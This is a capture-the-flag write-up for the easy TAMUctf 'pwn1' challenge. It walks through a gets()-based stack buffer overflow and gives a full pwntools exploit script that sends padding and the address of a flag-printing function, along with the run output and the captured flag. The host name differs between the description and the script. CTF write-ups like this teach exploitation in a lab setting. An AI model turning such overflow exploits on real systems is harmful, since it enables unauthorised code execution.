## Pwn1 - Pwn

**Description:** `nc pwn.tamuctf.com 4321`
**Challenge:** : pwn1
**Difficulty:** easy
**Solved by:** Neolex  

**Solution:**  
This challenge is a simple **buffer overflow**. 
First, the binary ask us a question : 
"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?"
we have to answer : "Sir Lancelot of Camelot"
then, another one:  "What... is your quest?"
we answer : "To seek the Holy Grail."
Then the question is : "What... is my secret?" 
and the call to read the answer is not fgets this time but **gets** which is a vulnerable function (see ```man gets```: 
```
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many
       characters gets() will read, and because gets() will continue to store characters past  the  end
       of  the  buffer, it is extremely dangerous to use.  It has been used to break computer security.
       Use fgets() instead
       
```
 If we enter "A"*43+"BBBB" the binary returns to 0x42424242 which is our B's : we control the execution.    
 Fortunaly the binary gives us a function "print_flag" at address 0xdea110c8 which prints the content of the file flag.txt.
 So here is our exploit script 
 ```python
 from pwn import *

# p = process('./pwn1')
p = remote('wn.tamuctf.com',4321)

p.recvuntil("name?")
p.sendline("Sir Lancelot of Camelot")
p.recvuntil("quest?")
p.sendline("To seek the Holy Grail.")
p.recvuntil("secret?")

payload = "A"*43
payload += p32(0xdea110c8)

p.sendline(payload)
print p.recvall()
 ```
 Let's run it : 
 ```
$ python exploit.py                         
[+] Opening connection to wn.tamuctf.com on port 4321: Done
[+] Receiving all data: Done (50B)
[*] Closed connection to wn.tamuctf.com port 4321

Right. Off you go.
gigem{34sy_CC428ECD75A0D392}
 ```
 
**Flag:**  
gigem{34sy_CC428ECD75A0D392}


